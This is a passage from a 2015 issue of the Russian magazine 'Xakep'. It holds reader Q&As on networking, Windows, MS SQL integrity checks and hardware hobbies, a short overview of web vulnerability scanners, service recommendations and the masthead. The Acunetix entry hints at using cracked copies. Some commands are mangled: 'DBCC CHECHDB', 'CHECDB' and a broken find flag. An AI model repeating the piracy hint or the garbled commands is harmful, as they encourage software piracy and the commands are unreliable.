бу журнала регистрации либо с помо-
щью модуля отслеживания событий
(ETW)  ядра, либо через RPC. Боль-
шинство генерируемых в ядре собы-
тий поступает прямо в ETW, а события,
требующие сложного форматирова-
ния, направляются в LSA для формати-
рования. LSA направляет большинство
событий в журнал регистрации через   Аудит в Windows
ETW, используя канал RPC.


Q  Есть ли какой-то репозиторий по эксплоитам?
   О да, вот, держи. Это официальный репозиторий небезызвестного ресур-
A  са exploit-db. База постоянно пополняется, есть утилиты для удобного по-
иска нужных эксплоитов.





База эксплоитов

Q  Сетевая карта упорно получает адрес 169.254.5.6. Что делать?
    Подобная трабла возникает тогда, когда есть проблемы получения сете-
A  вого адреса от DHCP-сервера. Вариантов того, что здесь неисправно, —
масса: начиная от не воткнутого в сетевую карту сетевого кабеля, и, кстати,
слетевших дров для нее, заканчивая проблемами с самим сервером и косяка-
ми на маршруте. Стоит где-нибудь в подвале старенький маршрутизатор, о ко-
тором уже никто и не помнит, а он чудит периодически, всякое бывает. Глав-
ное — определить размах проблемы. Начать можно с самого компьютера: если
проблема именно в нем, то копать не так уж и много — драйверы да сама же-
лезка. А вот если это где-то, то тут уже нужно представлять схему устройства
локальной сети или рисовать, чтобы проще было вычислить возможное место
проблемы. Главное — пробовать и методично проверять и отсеивать версии.

Q  Как можно получить список драйверов на Win-машине?
    Для этого можно открыть Ddevice manager, в котором можно найти инфор-
A  мацию по всем драйверам, установленным на машине. Там же их можно
переустановить, удалить или откатить на предыдущую версию.

Q OST/PST-файлы — что это такое и зачем они нужны?
    Эти оба формата файлов принадлежат программе Outlook. В PST содер-
A  жатся файлы сообщений, которые хранятся на локальном компьютере,
а в OST хранятся автономные данные, такие как календарь, которые потом до-
ступны пользователю без интернета.

    Как можно сделать печатную плату, если с ЛУТ не хочется связы-
Q  ваться?
    Для этого можно воспользоваться так называемой карандашной техни-
A  кой. Берем корректор-карандаш  (в простонародье замазка) и рисуем
дорожки. Конечно же, точность и эстетика будут хромать на обе ноги, но если
нужно сделать что-то «на коленке» для своего использования, то почему бы
и нет. Также для этих целей подойдет специальный маркер, которым можно ри-
совать на дисках. Но не все маркеры полезны, многие весьма успешно вытрав-
ляются, и на выходе получается загубленная заготовка. Маркеры, которые про-
верены  и  точно  выполняют  свою
функцию, — это серия Edding. Подой-
дут следующие: Edding 792, Edding
791, Edding 780. Найти их можно в лю-
бых магазинах электроники или в кан-   Edding 792
целярских магазинах.

КАКИЕ ВЕБ-СКАНЕРЫ ПОСОВЕТУЕШЬ ДЛЯ ИЗУЧЕНИЯ?


             Количество сканеров, представленных на рынке сегодня, просто
     1     огромно. Среди них как и узкоспециализированные под какую-то
            одну багу или технологии, так и серьезные монстры, способные
             найти уязвимость, раскрутить ее и вытащить необходимые дан-
             ные. Есть как платные, так и распространяемые под свободными
             лицензиями. И те и другие имеют право на жизнь, и кто из них
            лучше — это еще вопрос. Любой сканер, к сожалению (а может,
            и к счастью), неспособен реально оценить положение вещей, он
            не может с точностью до байта сказать, что в этом участке кода
             спрятана уязвимость. Именно поэтому многие не сильно дове-
            ряют сканерам или же делают ими лишь поверхностный анализ.

               Metasploit — думаю, что этот монстр не нуждается в представле-
   2     нии. Включен практически во все хакерские дистрибутивы,
            а в широко известном Kali так вообще входит в топ-10 самого
            распространенного софта, и, поверь, не просто так. Огромная
            база эксплоитов и возможностей поистине внушает уважение.
           Этим инструментом можно хакать практически что угодно. Имеет
            консольный интерфейс, но при желании легко прикручивается
              GUI, который делает Metasploit еще более привлекательным для
             использования.

            W3af — весьма интересный сканер с кучей фишек, написан на пи-
   3    тоне и позволяет допилить или переписать любой нужный тебе
              плагин. Изначально плагинов довольно много, и они настроены
            по умолчанию. В зависимости от их параметров сканер будет ра-
             ботать лучше или хуже. После окончания сканирования есть воз-
            можность проэксплуатировать найденные баги. Также есть кон-
            сольный интерфейс и GUI. Довольно мощная документация
            и поддержка сообщества.

               Acunetix. Тоже весьма интересный сканер, работает на платфор-
   4   ме Win, платный, но сам знаешь где можно найти старенькие кря-
             кнутые версии. Им очень удобно сканить целые диапазоны ай-
            пишников или доменов. Рисует красивые отчеты. С каждой новой
            версией дополняется различными приятными фичами и возмож-
             ностями. Имеет весьма красивый интерфейс, а разобраться
             с ним проще простого. К сожалению, имеет слишком большое
             количество ложных срабатываний. Но для общей картины в мас-
             сах весьма хорош, дабы пройтись по топ-10 OWASP.

             Burp Suite на самом деле не совсем сканер, хотя, конечно, в плат-
  5    ной версии это есть и весьма успешно работает. Но чаще всего
              этот инструмент используется для модификации запросов к сер-
             веру или изучения ответов сервера. Есть разные расширения, как
              тот же спайдер, который найдет все страницы ресурса или помо-
             жет декодировать какую-то едкую строку в нужную кодировку.
            Также в Сети разбросаны различные самописные плагины, не го-
            воря уже о том, что можно написать и самому. Словом, инстру-
              мент, практически незаменимый в повседневной работе.


Q  Как проверить целостность БД MS SQL?
    Для этого существует специальная встроенная утилита DBCC CHECHDB,
A  которая позволяет обнаружить поврежденные страницы, но только при
чтении с диска. Обычно данные считываются с диска только при обращении
к ним пользователей или приложений. Но лучше предотвратить получение
пользователями сообщений об ошибках, заранее выявляя повреждения и ис-
правляя их с использованием резервных копий. Команда DBCC CHECHDB за-
ставляет SQL Server прочитать с диска все страницы и проверить их целост-
ность. Общий синтаксис этой команды таков:

DBCC CHECDB [{ 'имя_базы_данных' | database_id | 0
[ , NOINDEX | { REPAIR_ALLOW_DATA_LOSS | REPAIR_FAST |
  REPAIR_REBUILD } ] )]
[ WITH {[ ALL_ERRORMSGS ] [ , [ NO_INFOMSGS ] ] [ , [ TABLOCK ] ]
[ , [ ESTIMATEONLY ] ] [ , [ PHYSICAL_ONLY ] ] |
  [ , [ DATA_PURITY ] ] } ]

Выполняя эту команду, SQL Server делает следующее:

1. Проверяет выделение страниц в базе данных.
2. Проверяет целостность структуры всех таблиц и индексированных представ-
   лений.
3. Пересчитывает контрольные суммы всех страниц данных и индексов и срав-
   нивает их с хранящимися контрольными суммами.
4. Проверяет содержимое всех индексированных представлений.
5. Проверяет каталог базы данных.
6. В базе данных проверяет данные компонента Srvice Broker.

При этом сообщается обо всех обнаруженных ошибках, чтобы можно было
устранить их. Если ошибка целостности найдена в индексе, его необходимо
удалить и создать заново. Для исправления ошибки целостности в таблице
следует восстановить ее из самой свежей резервной копии.

    USB-хаб постоянно тупит и отваливается, можно ли с ним что-то
Q  сделать?
     Такое частенько случается, когда к хабу подключено слишком много
A  источников. Выходов не такой уж большой выбор. Для начала можно со-
кратить количество девайсов на хаб и, соответственно, на один порт или же
присмотреться к хабам с дополнительным источником питания. Это, пожалуй,
самый лучший способ. При этом экономить на хабе я бы не стал, ведь в случае
короткого замыкания или перегрузки ценой собственной жизни он может спа-
сти порт дорогостоящего компьютера.


СТАВИТЬ ЛИ КАСТОМНУЮ ПРОШИВКУ
НА ТЕЛЕФОН ИЛИ НЕТ?



        Конечно же, да! Все плюсы просто не перечислить, начиная от того,
         что более экономно расходуется батарея, так еще до кучи можно по-
         ставить свое ядро, тем самым значительно оптимизировав обработ-
          ку данных, можно встраивать свои скрипты, которые также ускоряют
        девайс и увеличивают удобство. Можно наконец-то удалить все не-
        нужные программы, любовно установленные вендором, и тем самым
         получить значительно больше памяти под свои нужды.

         Установка кастомной прошивки несет в себе использование прав root
        на смартфоне. Хорошо это или нет, сложно сказать, но если сильно
         абстрагироваться, то, получается, дверь в дом просто становится от-
        крытой для всех желающих. Одно неправильное действие, и телефон
        превращается в кирпич, и нужно будет все кропотливо восстанавли-
          вать. Плюс кастомные прошивки не так сильно обкатываются, как за-
         водские, и баги там не редкость — порой весьма неприятные, как, на-
        пример, отсутствие поддержки фронтальной фотокамеры.


Q  Что бы почитать и посмотреть по MS SQL Server для изучения?
    За материалами я рекомендую обратиться к официальным руководствам
A  и видео. Также будут хороши учебники для подготовки к сертификацион-
ным экзаменам по MS SQL Server, они есть и на русском, и на английском. Как
сам понимаешь, английский вариант более удобен и хорош как для сдачи экза-
менов, так и для усвоения знаний.

    Как в Linux через find найти файлы в папках, в названии которых
Q  только два символа?
    Для этого будет достаточно такой команды:
A
  find . — type f -name "??.png"

Как видишь, все довольно просто, главное — больше экспериментировать и ком-
бинировать различные варианты, которые описаны в официальном мане.
     GOOGLE TONE
            http://goo.gl/Cys0rt
1





         Этот плагин для Chrome пересылает ссылки звуком
                        В Google любят интересные эксперименты, и плагин для
       Chrome под названием Tone — один из них. Он позволяет пе-
        реслать ссылку на другой компьютер, не используя ни интернет,
        ни локальную сеть, ни Bluetooth. Достаточно, чтобы у передаю-
       щего был динамик, а у принимающего — микрофон. Нажимаем
         кнопку, и плагин издает приятное пиликанье. Если рядом есть
       компьютеры с Tone, они получат URL и предложат перейти. Наш
         совет: подсадив друзей и коллег на Tone, не забудь сразу вы-
        слать эту ссылку.




       LINGVIST
               lingvist.io/ru
2





         Карточки со словами для изучающих английский
                        Существует масса современных и бесплатных способов изу-
         чать иностранные языки. На мобильных платформах есть Duolingo,
        а тем, кто хочет учиться, сидя за компьютером, пригодится сервис
           Lingvist. Он помогает расширить словарный запас: тебе показы-
        вают карточку со словом на родном языке, а ты вводишь перевод.
        Если перевода не знаешь, Lingvist подскажет правильный ответ.
        Русскоязычным пользователям пока доступно изучение только
        английского, но в будущем разработчики обещают добавить
        другие языки.

     OMNIFLOW
            omniflow.io
3





         Записная книжка с раскладными пунктами
                        Есть такой класс программ для работы с текстом — аутлайнеры.
       Полезны они в тех случаях, когда нужно структурировать документ с
        кучей пунктов и подпунктов (удобно, к примеру, для планов и идей).
        Аутлайнер позволяет «схлопывать» пункты подобно тому, как со-
       временные IDE могут сворачивать блоки кода. Omniflow — одна из
        попыток реализовать аутлайнер в браузере, и довольно неплохая:
       поддерживаются картинки и формулы, а также длинный список кла-
        виатурных шоткатов.

     GARBAGE CAT
            grey2scale.itch.io/garbage-cat
4





         Игра про милого котика, который сеет хаос
                        Следуя традиции последних выпусков, завершаем обзор ссыл-
        кой на браузерную игру. Она поможет отвлечься от забот, но не
        настолько, чтобы выпасть из жизни. В Garbage Cat ты играешь ко-
       том и должен разбудить своего хозяина. В ход идут все грязные
        кошачьи приемы: можно душераздирающе мяукать, забираться на
        голову и урчать и, конечно, крушить мебель и скидывать имущество
        с полок и стола. Стилизация под игры восьмидесятых и использо-
        вание HTML5 — приятные достоинства Garbage Cat.
                                     16+





  № 07 (198)

                     Илья Русанен            Алексей Глазков
                       Главный редактор         Выпускающий редактор
                          rusanen@glc.ru                  glazkov@glc.ru

                 Андрей Письменный             Евгения
                       Шеф-редактор             Шарипова
                         pismenny@glc.ru                                                Литературный редактор


                       РЕДАКТОРЫ РУБРИК

      Андрей Письменный       Антон «ant» Жуков           Александр «Dr.»
       PC ZONE и СЦЕНА            ВЗЛОМ                 Лозовский
          pismenny@glc.ru              zhukov@glc.ru            MALWARE, КОДИНГ,
                                                           PHREAKING
                                                                         lozovsky@glc.ru       Юрий Гольцев          Илья Илембитов
          ВЗЛОМ                    UNITS
            goltsev@glc.ru                ilembitov@glc.ru            Евгений Зобнин
                                                               X-MOBILE
                                                                         zobnin@glc.ru         Илья Русанен           Павел Круглов
           КОДИНГ              UNIXOID и SYN/ACK
           rusanen@glc.ru                kruglov@glc.ru


                                 АРТ

        Елена Тихонова           Алик Вайнер           Екатерина Селиверстова
           Арт-директор               Дизайнер                     Дизайнер
                                     Обложка                    Верстальщик

                                                        Анна Королькова
                                                                 Верстальщик
                                                            цифровой версии


                              DVD

                    Антон «ant» Жуков         Максим Трубицын
                  Выпускающий редактор           Монтаж видео
                           zhukov@glc.ru


                           РЕКЛАМА

                    Анна Яковлева         Мария Самсоненко
                       PR-менеджер            Менеджер по рекламе
                          yakovleva.a@glc.ru            samsonenko@glc.ru


                  РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                  Подробная информация по подписке shop.glc.ru, info@glc.ru
                                  Отдел распространения
                                Наталья Алехина (lapina@glc.ru)
                          Адрес для писем: Москва, 109147, а/я 50





В случае возникновения вопросов по качеству печати: claim@glc.ru. Адрес редакции: 115280, Москва, ул. Ленинская Слобода, д. 19, Омега плаза. Изда-
тель: ООО «Эрсиа»: 606400, Нижегородская обл., Балахнинский р-н, г. Балахна, Советская пл., д. 13. Учредитель: ООО «Принтер Эдишионс», 614111, Перм-
ский край, г. Пермь, ул. Яблочкова, д. 26. Зарегистрировано в Федеральной службе по надзору в сфере связи, информационных технологий и массовых
коммуникаций (Роскомнадзоре), свидетельство ПИ № ФС77-56756 от 29.01.2014 года. Мнение редакции не обязательно совпадает с мнением авто-
ров. Все материалы в номере предоставляются как информация к размышлению. Лица, использующие данную информацию в противозаконных целях,
могут быть привлечены к ответственности. Редакция не несет ответственности за содержание рекламных объявлений в номере. По вопросам лицензи-
рования и получения прав на использование редакционных материалов журнала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2015